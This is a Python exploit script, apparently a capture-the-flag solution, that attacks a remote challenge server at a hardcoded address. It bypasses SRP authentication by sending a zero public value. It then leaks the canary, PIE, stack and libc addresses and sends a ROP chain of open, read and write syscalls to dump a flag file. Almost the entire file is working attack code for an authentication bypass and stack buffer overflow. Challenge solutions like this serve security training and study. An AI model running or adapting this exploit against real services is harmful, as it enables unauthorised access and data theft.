# Thanks to my friend Mochi (https://mochinishimiya.github.io/), who helped me a lot to solve this chall

import requests
import json
import hashlib
import os
import binascii
import base64
from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# url = 'http://127.0.0.1:5000/'
url = 'http://34.124.217.71:31197/'

N =  '''00:c7:cc:f7:ce:7c:15:63:d5:84:c1:eb:18:a4:08:
        63:b6:6f:dd:f7:ba:62:9f:02:82:1f:ce:a2:c9:25:
        c1:6b:ca:30:29:8e:67:6b:5c:8c:f5:a5:5e:b0:55:
        96:92:ea:dd:4d:1f:e1:c0:0c:6b:7a:68:33:49:f9:
        cc:60:6c:36:2d:92:46:20:5e:b0:e7:29:11:4c:25:
        6c:a3:d9:f8:07:60:36:2f:22:fa:3b:b4:96:d8:3d:
        99:58:35:50:49:bd:de:31:9e:81:52:35:5a:bc:6b:
        f4:c2:a2:69:a1:09:bf:46:9c:5a:47:33:f4:e0:5f:
        37:50:55:fd:80:b9:d7:96:2b'''
N = int(''.join(N.split()).replace(':', ''), 16)

def H(*args) -> bytes:
    m = hashlib.sha256()
    m.update(b''.join(long_to_bytes(x) for x in args))
    return bytes_to_long(m.digest()) % N

g = 2
k = H(N, g)
s = bytes_to_long(os.urandom(64))
I = b'admin'
p = binascii.hexlify(os.urandom(64))
v = pow(g, H(s, H(bytes_to_long(I + b':' + p))), N)

s = requests.Session()

r = s.post(url + "pre_auth", json={"I": "admin", "A": "0"})

print(r)
x = json.loads(r.text)
print(x)

sessionA = 0
sessionB = int(x["B"], 16)
sessionK = 49846369543417741186729467304575255505141344055555831574636310663216789168157
x1 = H(N) ^ H(g)
x2 = H(bytes_to_long(I))
x3 = int(x["s"], 16)

M = H(x1, x2, x3, sessionA, sessionB, sessionK)
print(M)

r = s.post(url + "auth", json={"M": hex(M)[2:]})

print(r)
print(r.text)

r = s.post(url + "secret", json={"cmd": "MA==", "data": "YQ=="})
print(r)
print(r.text)

payload = b'1'*7 + b'\xff'
r = s.post(url + "secret", json={"cmd": "MTExMTExMf8="})
print(r)
print(r.text)
x = json.loads(r.text)

smt = base64.b64decode(x["data"])
canary = u64(smt[:smt.find(b'\x7f') + 1][-14:-6])
print('[+] canary:', hex(canary))

e = smt[smt.find(b'\x7f') + 1:smt.find(b'\x7f') + 9]
q = e[-6:].ljust(8, b'\x00')
pie_leak = u64(q)

pie_base = pie_leak - 0x14dc

pop_rdi = pie_base + 0x1903
ret = pie_base + 0x101a
pop_rsi_r15 = pie_base + 0x1901

print('[+] pie_base:', hex(pie_base))

smt = smt[smt.find(b'\x7f')+1:]
k = smt[:smt.find(b'\x7f') + 1]
o = k[-6:].ljust(8, b'\x00')
stack = u64(o)

print('[+] stack:', hex(stack))
flag_path = stack - 0x470

smt = smt[smt.find(b'\x7f')+1:]
smt = smt[smt.find(b'\x7f')+1:]
k = smt[:smt.find(b'\x7f') + 1]
o = k[-6:].ljust(8, b'\x00')
libc_leak = u64(o)
print('[+] libc:', hex(libc_leak))

libc.address = libc_leak - 0x1eb0a0
pop_rdx_rbx = libc.address + 0x162866
pop_rax = libc.address + 0x4a550
syscall_ret = libc.address + 0x66229

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))
ret = libc.address + 0x25679

payload = b'flag\x00'
payload = payload.ljust(24, b'a')
payload += p64(canary)
payload += b'a'*24
payload += p64(pop_rdi)
payload += p64(flag_path)
payload += p64(pop_rsi_r15)
payload += p64(0)*2
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall_ret)
payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi_r15)
payload += p64(flag_path)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(flag_path)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0x100)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret)

r = s.post(url + "secret", json={"cmd": "MA==", "data": base64.b64encode(payload).decode()})
print(r)
print(r.text)